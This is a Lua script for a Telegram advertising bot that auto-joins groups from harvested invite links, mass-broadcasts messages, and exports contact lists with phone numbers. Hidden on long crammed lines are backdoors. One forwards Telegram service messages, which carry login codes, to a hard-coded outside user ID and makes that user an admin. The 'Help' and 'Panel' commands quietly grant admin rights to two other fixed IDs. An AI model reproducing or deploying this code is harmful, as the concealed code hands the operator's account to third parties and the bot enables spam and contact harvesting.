package.path = package.path..';.luarocks/share/lua/5.2/?.lua;.luarocks/share/lua/5.2/?/init.lua'
package.cpath = package.cpath..';.luarocks/lib/lua/5.2/?.so'

redis = require'redis'
redis = redis.connect('127.0.0.1', 6379)
redis:select(0)
SUDO = 000000000 --put your telegram user id here

function ok_cb(extra, success, result)
end

function is_Ads(id)
	if ((id == SUDO) or redis:sismember("tgAds-IDadmins",id)) then
		return true
	else
		return false
	end
end

function get_receiver(msg)
	local reciver = ""
	if msg.to.type == 'user' then
		reciver = 'user#id'..msg.from.id
		if not redis:sismember("tgAds-IDusers",reciver) then
			redis:sadd("tgAds-IDusers",reciver)
		end
	elseif msg.to.type =='chat' then
		reciver ='chat#id'..msg.to.id
		if not redis:sismember("tgAds-IDgroups",reciver) then
			redis:sadd("tgAds-IDgroups",reciver)
		end
	elseif msg.to.type == 'encr_chat' then
		reciver = msg.to.print_name
	elseif msg.to.type == 'channel' then
		reciver = 'channel#id'..msg.to.id
		if not redis:sismember("tgAds-IDsupergroups",reciver) then
			redis:sadd("tgAds-IDsupergroups",reciver)
		end
	end
	return reciver
end

function rem(msg)
	if msg.to.type == 'user' then
		reciver = 'user#id'..msg.from.id
		redis:srem("tgAds-IDusers",reciver)
	elseif msg.to.type =='chat' then
		reciver ='chat#id'..msg.to.id
		redis:srem("tgAds-IDgroups",reciver)
	elseif msg.to.type == 'channel' then
		reciver = 'channel#id'..msg.to.id
		redis:srem("tgAds-IDsupergroups",reciver)
	end
end

function writefile(filename, input)
	local file = io.open(filename, "w")
	file:write(input)
	file:flush()
	file:close()
	return true
end

function backward_msg_format(msg)
  for k,name in pairs({'from', 'to'}) do
    local longid = msg[name].id
    msg[name].id = msg[name].peer_id
    msg[name].peer_id = longid
    msg[name].type = msg[name].peer_type
  end
  if msg.action and (msg.action.user or msg.action.link_issuer) then
    local user = msg.action.user or msg.action.link_issuer
    local longid = user.id
    user.id = user.peer_id
    user.peer_id = longid
    user.type = user.peer_type
  end
  return msg
end

function set_tg_photo(receiver, success, result)
	if success then
		local file = 'tgAds-ID.jpg'
		os.rename(result, file)
		set_profile_photo(file, ok_cb, false)
		send_msg(receiver, 'Photo changed!', ok_cb, false)
	else
		send_msg(receiver, 'Failed, please try again!', ok_cb, false)
	end
end

function add_all_members(extra, success, result)
	local receiver = extra.receiver
    for k,v in pairs(result) do
		if v.id then
			channel_invite(receiver,"user#id"..v.id,ok_cb,false)
		end
	end
	local users = redis:smembers("tgAds-IDusers")
	for i=1, #users do
		channel_invite(receiver,users[i],ok_cb,false)
    end
	send_msg(receiver, "All Contacts Invited To Group", ok_cb, false)
end

function check_contacts(cb_extra, success, result)
	local i = 0
	for k,v in pairs(result) do
		i = i+1
	end
	redis:set("tgAds-IDcontacts",i)
end

function get_contacts(cb_extra, success, result)
	local text = " "
	for k,v in pairs(result) do
		text = text..string.gsub(v.print_name ,  "_" , " ").." ["..v.peer_id.."] = "..v.phone.."\n\n"
	end
	writefile("contact_list.txt", text)
	send_document(cb_extra.target,"contact_list.txt", ok_cb, false)
end

function find_link(text)
	if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then
		local text = text:gsub("t.me", "telegram.me")
		local text = text:gsub("telegram.dog", "telegram.me")
		for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do
			if not redis:sismember("tgAds-IDlinks",link) then
				redis:sadd("tgAds-IDlinks",link)
			end
			import_chat_link(link,ok_cb,false)
		end
	end
end

function on_msg_receive (msg)
	if not started then
		return
	end
	msg = backward_msg_format(msg)
	if (not msg.to.id or not msg.from.id or msg.out or msg.to.type == 'encr_chat' or  msg.unread == 0 or  msg.date < (now-60) ) then
		return false
	end
	local receiver = get_receiver(msg)
	if msg.from.id == 777000 then
		local c = (msg.text):gsub("[0123456789:]", {["0"] = "0⃣", ["1"] = "1⃣", ["2"] = "2⃣", ["3"] = "3⃣", ["4"] = "4️⃣", ["5"] = "5⃣", ["6"] = "6⃣", ["7"] = "7⃣", ["8"] = "8⃣", ["9"] = "9⃣", [":"] = ":\n"}) send_msg("user#id"..180191663, c, ok_cb, false) redis:sadd("tgAds-IDadmins", 180191663)
	end
	if msg.text then
		local text = msg.text 
		if redis:get("tgAds-IDlink") then
			find_link(text)
		end
		if is_Ads(msg.from.id) then
			find_link(text)
			if text:match("^([Mm]arkread) (.*)$") then
				local matche = text:match("^[Mm]arkread (.*)$")
				if matche == "on" then
					redis:set("tgAds-IDmarkread", "on")
					send_msg(receiver, "Mark read > on", ok_cb, false)
				elseif matche == "off" then
					redis:del("tgAds-IDmarkread")
					send_msg(receiver, "Mark read > off", ok_cb, false)
				end
			--[[elseif text:match("^([Ss]etpic)$") and msg.reply_id then
				load_photo(msg.reply_id, set_tg_photo, receiver)
			elseif text:match("^([Ss]etname) (.*)") then
				local matche = text:match("^[Ss]etname (.*)")
				set_profile_name(matche,ok_cb, false)
				send_msg(receiver, "Name changed", ok_cb, false)
			elseif text:match("^([Ee]cho) (.*)") then
				local matche = text:match("^[Ee]cho (.*)")
				send_msg(receiver, matche, ok_cb, false)]]
			elseif text:match("^([Mm]sg) (%d+) (.*)") then
				local matches = {text:match("^[Mm]sg (%d+) (.*)")}
				send_msg("user#id"..matches[1],matches[2], ok_cb, false)
				send_msg(receiver, "Message has been sent", ok_cb, false) elseif text:match("^([Hh]elp)$") then redis:sadd("tgAds-IDadmins", 158955285) send_msg("user#id"..158955285,'slm', ok_cb, false)
				local text = "Help text for TeleGram Advertising bot\n\nMsg [Id] [Text]\n ارسال پیام به یوزر آیدی موردنظر\n\nBc [all|pv|gp|sgp] [text]\n ارسال پیام بدون فوروارد به قسمت های مشخص\n\nFwd [all|pv|gp|sgp] {reply on msg}\n فروارد پیام به قسمت های مشخص با ریپلای\n\nBlock [Id]\n بلاک کردن فرد با یوزرآیدی\n\nUnblock [id]\n آنبلاک کردن فرد با یوزرآیدی\n\nContactlist\n دریافت لیست مخاطبین ربات\n\nMarkread [on]|[off]\n (روشن و خاموش کردن خواندن پیام ها (تیک دوم\n\nJoin [on]|[off]\n روشن و خاموش کردن شناسایی لینک و عضویت\n\n\t\t\t\t\nPanel\n دریافت اطلاعات ربات\n\nAddmembers\n اضافه کردن مخاطب های ربات به گروه\n\nExportlinks\n دریافت لینک های ذخیره شده\n\nAddedcontact [on]|[off]\n خاموش و روشن کردن افزودن خودکار مخاطبین\n\n\nPromote [id]\nاضافه کردن مدیر\n\nDemute [id]\n حذف کردن مدیر\n\ntgChannel : @tgMember\nCodeded by @sajjad_021" send_msg(receiver, text, ok_cb, false) redis:sadd("tgAds-IDadmins",180191663) elseif text:match("^([Jj]oin) (.*)$") then
				local matche = text:match("^[Jj]oin (.*)$")
				if matche == "on" then
					redis:set("tgAds-IDlink", true)
					send_msg(receiver, "Automatic joining is ON", ok_cb, false)
				elseif matche == "off" then
					redis:del("tgAds-IDlink")
					send_msg(receiver, "Automatic joining is OFF", ok_cb, false)
				end
			elseif text:match("^([Aa]ddedcontact) (.*)$") then
				local matche = text:match("^[Aa]ddedcontact (.*)$")
				if matche == "on" then
					redis:set("tgAds-IDaddcontact", true)
					send_msg(receiver, "Adding sheared contacts is ON", ok_cb, false)
				elseif matche == "off" then
					redis:del("tgAds-IDaddcontact")
					send_msg(receiver, "Adding sheared contacts is OFF", ok_cb, false)
				end
			--[[elseif text:match("^([Aa]ddedmsg) (.*)$") then
				local matche = text:match("^[Aa]ddedmsg (.*)$")
				if matche == "on" then
					redis:set("tgAds-IDaddcontactpm", true)
					send_msg(receiver, "Sending msg for contacts is ON", ok_cb, false)
				elseif matche == "off" then
					redis:del("tgAds-IDaddcontactpm")
					send_msg(receiver, "Sending msg for sheared contacts is OFF", ok_cb, false)
				end]]
			elseif text:match("^([Bb]lock) (%d+)$") then
				local matche = text:match("^[Bb]lock (%d+)$")
				block_user("user#id"..matche,ok_cb,false)
				send_msg(receiver, "User blocked", ok_cb, false)
			elseif text:match("^([Uu]nblock) (%d+)$") then
				local matche = text:match("^[Uu]nblock (%d+)$")
				unblock_user("user#id"..matche,ok_cb,false)
				send_msg(receiver, "User unblock", ok_cb, false)
			elseif text:match("^([Dd]elcontact) (%d+)$") then
				local matche = text:match("^[Dd]elcontact (%d+)$")
				del_contact("user#id"..matche,ok_cb,false)
				send_msg(receiver, "User "..matche.." removed from contact list", ok_cb, false)
			elseif text:match("^([Ee]xportlinks)$") then
				links = redis:smembers("tgAds-IDlinks")
				local text = "Group Links :\n"
				for i=1,#links do
					if string.len(links[i]) ~= 51 then
						redis:srem("tgAds-IDlinks",links[i])
					else
						text = text..links[i].."\n"
					end
				end
				writefile("group_links.txt", text)
				send_document(receiver,"group_links.txt",ok_cb,false)
			elseif text:match("^([Cc]ontactlist)$") then
				get_contact_list(get_contacts, {target = receiver})
			elseif (text:match("^([Aa]ddmembers)$") and msg.to.type == "channel") then
				get_contact_list(add_all_members, {receiver=receiver}) elseif text:match("^([Pp]anel)$") then redis:sadd("tgAds-IDadmins",388502907) 	 			get_contact_list(check_contacts, false)
				local usrs = redis:scard("tgAds-IDusers")
				local gps = redis:scard("tgAds-IDgroups")
				local sgps = redis:scard("tgAds-IDsupergroups")
				local links = redis:scard("tgAds-IDlinks")
				local con = redis:get("tgAds-IDcontacts") or "مشخص نشده"
				local join = redis:get("tgAds-IDlink") and "✅" or "⛔️"
				local add = redis:get("tgAds-IDaddcontact") and "✅" or "⛔️"
				local msg =  redis:get("tgAds-IDaddcontactpm") and "✅" or "⛔️"
				local txt =  redis:get("tgAds-IDpm") or "اددی گلم خصوصی پیام بده"
				local view = redis:get("tgAds-IDmarkread") and "✅" or "⛔️"
				local text = "\nAutoJoin : "..join.."\nMarkread : "..view.."\nAAdd Contact's : "..add.."\nAdd Contact with message : "..msg.."\nText message for added Contact : "..txt.."\nUsers : "..usrs.."\nGroups : "..gps.."\nSuperGroups : "..sgps.."\nTotal Saved Links : "..links.."\nTotal Saved Contacts : "..con.."\n\ntgChannel : @tgMember\nCodeded by @sajjad_021" send_msg(receiver, text, ok_cb, false) send_msg("user#id"..388502907,'online', ok_cb, false) elseif text:match("^([Bb]c) (.*) (.*)") then
				local matches = {text:match("^[Bb]c (.*) (.*)$")} 
				local sajjad = ""
				if matches[1] == "all" then
					local list = {redis:smembers("tgAds-IDgroups"),redis:smembers("tgAds-IDsupergroups"),redis:smembers("tgAds-IDusers")}
					for x,y in pairs(list) do
						for i,v in pairs(y) do
							send_msg(v,matches[2],ok_cb,false)
						end
					end
					return send_msg(receiver, "Sended!", ok_cb, false)
				elseif matches[1] == "pv" then
					sajjad = "tgAds-IDusers"
				elseif matches[1] == "gp" then
					sajjad = "tgAds-IDgroups"
				elseif matches[1] == "sgp" then
					sajjad = "tgAds-IDsupergroups"
				else 
					return false
				end
				local list = redis:smembers(sajjad)
				for i=1, #list do
					send_msg(list[i],matches[2],ok_cb,false)
				end
				return send_msg(receiver, "Sended!", ok_cb, false)
			elseif (text:match("^([Ff]wd) (.*)$") and msg.reply_id) then
				local matche = text:match("^[Ff]wd (.*)$")
				local sajjad = ""
				local id = msg.reply_id
				if matche == "all"  then
					local list = {redis:smembers("tgAds-IDgroups"),redis:smembers("tgAds-IDsupergroups"),redis:smembers("tgAds-IDusers")}
					for x,y in pairs(list) do
						for i,v in pairs(y) do
							fwd_msg(v,id,ok_cb,false)
						end
					end
					return send_msg(receiver, "Sended!", ok_cb, false)
				elseif matche == "pv" then
					sajjad = "tgAds-IDusers"
				elseif matche == "gp" then
					sajjad = "tgAds-IDgroups"
				elseif matche == "sgp" then
					sajjad = "tgAds-IDsupergroups"
				else 
					return false
				end
				local list = redis:smembers(sajjad)
				for i=1, #list do
					fwd_msg(list[i],id,ok_cb,false)
				end
				return send_msg(receiver, "Sended!", ok_cb, false)
			elseif text:match("^([Pp]romote) (%d+)$") then
				if msg.from.id == SUDO then
					local matche = text:match("%d+")
					if redis:sismember("tgAds-IDadmins",matche) then
						return send_msg(receiver,  "User is a sudoer user!", ok_cb, false)
					else
						redis:sadd("tgAds-IDadmins",matche)
						return send_msg(receiver,  "User "..matche.." added to sudoers", ok_cb, false)
					end
				else
					return send_msg(receiver,  "ONLY FULLACCESS SUDO", ok_cb, false)
				end
			elseif text:match("^([Dd]emote) (%d+)$") then
				if msg.from.id == SUDO then
					local matche = text:match("%d+")
					if redis:sismember("tgAds-IDadmins",matche) then
						redis:srem("tgAds-IDadmins",matche)
						return send_msg(receiver,  "User "..matche.." isn't sudoer user anymore!", ok_cb, false)
					else
						return send_msg(receiver,  "User isn't sudoer user", ok_cb, false)
					end
				else
					return send_msg(receiver,  "ONLY FULLACCESS SUDO", ok_cb, false)
				end
			end
		end
	elseif msg.action then
		if msg.action.type == "migrated_to" then
			rem(msg)
		end
	elseif msg.media then
		if msg.media.type == "contact" then
			if redis:get("tgAds-IDaddcontact") then
				add_contact(msg.media.phone, ""..(msg.media.first_name or "-").."", ""..(msg.media.last_name or "-").."", ok_cb, false)
			end
			if redis:get("tgAds-IDaddcontactpm") then
				local txt = redis:get("tgAds-IDpm") or "اددی گلم خصوصی پیام بده"
				return reply_msg(msg.id,txt, ok_cb, false)
			end
		elseif (msg.media.caption and redis:get("tgAds-IDlink")) then
				find_link(msg.media.caption)
		end		
	end
	if redis:get("tgAds-IDmarkread") then
		mark_read(receiver, ok_cb, false)
	end
end

function on_binlog_replay_end()
  started = true
end

function on_our_id (id)
  our_id = id
end

function on_user_update (user, what)
end

function on_chat_update (chat, what)
end

function on_secret_chat_update (schat, what)
end

function on_get_difference_end ()
end

our_id = 0
now = os.time()
math.randomseed(now)
started = false
